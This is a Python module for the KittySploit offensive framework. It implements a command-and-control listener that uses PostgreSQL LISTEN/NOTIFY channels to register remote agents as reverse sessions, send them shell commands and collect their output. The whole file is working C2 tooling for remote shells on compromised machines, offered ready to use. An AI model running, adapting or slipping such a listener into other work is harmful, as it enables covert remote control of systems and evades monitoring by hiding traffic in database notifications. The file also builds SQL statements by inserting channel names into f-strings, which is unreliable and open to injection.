#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import select
import threading
import time

from kittysploit import *


class Module(Listener):
    __info__ = {
        "name": "PostgreSQL NOTIFY Shell Listener",
        "description": "C2 over PostgreSQL LISTEN/NOTIFY channels.",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "handler": Handler.REVERSE,
        "session_type": "polling",
        "protocol": "postgresql_notify",
        "dependencies": ["psycopg2-binary"],
    }

    host = OptString("127.0.0.1", "PostgreSQL host", True)
    port = OptPort(5432, "PostgreSQL port", True)
    username = OptString("postgres", "PostgreSQL username", True)
    password = OptString("", "PostgreSQL password", False)
    database = OptString("postgres", "Database name", True)
    command_channel = OptString("ks_cmd", "Channel used for commands", True)
    result_channel = OptString("ks_result", "Channel used for results/registration", True)
    client_id = OptString("agent1", "Client ID to create immediately", False)

    def __init__(self, framework=None):
        super().__init__(framework)
        self.conn = None
        self.running = False
        self._pending_commands = {}
        self._received_output = {}
        self._client_id_to_session = {}
        self._session_to_client_id = {}

    def _connect(self):
        try:
            import psycopg2
            from psycopg2.extensions import ISOLATION_LEVEL_AUTOCOMMIT
        except ImportError:
            print_error("psycopg2 is required for PostgreSQL NOTIFY listener")
            return False
        self.conn = psycopg2.connect(
            host=str(self.host),
            port=int(self.port),
            user=str(self.username),
            password=str(self.password or ""),
            dbname=str(self.database),
        )
        self.conn.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)
        with self.conn.cursor() as cur:
            cur.execute(f'LISTEN "{str(self.result_channel)}"')
        return True

    def _ensure_session(self, client_id, client_ip="postgresql"):
        if client_id in self._client_id_to_session:
            return self._client_id_to_session[client_id]
        data = {
            "protocol": "postgresql_notify",
            "client_id": client_id,
            "client_ip": client_ip,
            "command_channel": str(self.command_channel),
            "result_channel": str(self.result_channel),
            "handler": "reverse",
            "session_type": "polling",
            "listener_type": "postgresql_notify_shell",
        }
        sid = self._create_session("reverse", client_ip, int(self.port), data)
        if sid:
            self._client_id_to_session[client_id] = sid
            self._session_to_client_id[sid] = client_id
            self._pending_commands[sid] = []
            self._received_output[sid] = []
            print_success(f"PostgreSQL NOTIFY agent {client_id} -> session {sid}")
        return sid

    def _listen_loop(self):
        while self.running:
            if select.select([self.conn], [], [], 1) == ([], [], []):
                continue
            self.conn.poll()
            while self.conn.notifies:
                notify = self.conn.notifies.pop(0)
                try:
                    data = json.loads(notify.payload)
                except Exception:
                    data = {"client_id": "agent", "output": notify.payload}
                cid = str(data.get("client_id") or "agent")
                sid = self._ensure_session(cid, "postgresql")
                if data.get("type") == "register":
                    continue
                self._append_output(sid, str(data.get("output", notify.payload)))

    def run(self, background=False):
        if not self._connect():
            return False
        if str(self.client_id or "").strip():
            self._ensure_session(str(self.client_id).strip(), "postgresql")
        self.running = True
        self.listener_thread = threading.Thread(target=self._listen_loop, daemon=True)
        self.listener_thread.start()
        print_success(f"PostgreSQL NOTIFY listener started on channel {self.result_channel}")
        if background:
            return True
        try:
            while self.running:
                time.sleep(0.2)
        except KeyboardInterrupt:
            self.shutdown()
        return True

    def set_pending_command(self, session_id, cmd):
        client_id = self._session_to_client_id.get(session_id)
        if not client_id or not self.conn:
            return
        payload = json.dumps({"client_id": client_id, "command": cmd})
        with self.conn.cursor() as cur:
            cur.execute(f'NOTIFY "{str(self.command_channel)}", %s', (payload,))

    def _append_output(self, session_id, text):
        self._received_output.setdefault(session_id, []).append(text)
        self._received_output[session_id] = self._received_output[session_id][-500:]

    def get_output(self, session_id, clear=False):
        out = "\n".join(self._received_output.get(session_id, []))
        if clear:
            self._received_output[session_id] = []
        return out

    def get_output_lines(self, session_id, last_n=50):
        return self._received_output.get(session_id, [])[-last_n:]

    def shutdown(self):
        self.running = False
        if self.conn:
            self.conn.close()

